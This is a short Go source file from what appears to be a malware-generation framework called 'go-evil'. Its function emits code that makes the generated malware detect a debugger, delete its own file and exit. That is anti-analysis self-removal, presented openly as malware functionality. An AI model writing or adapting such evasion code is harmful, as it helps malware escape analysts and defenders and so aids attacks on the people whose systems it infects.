package debugger

import "github.com/TeamPhoneix/go-evil/utility/structure"

// Generates the code which will remove the malware
// after it has been launched in a debugger
func remove_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func remove_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Remove(spine.path)",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return structure.Send(data_object)
}
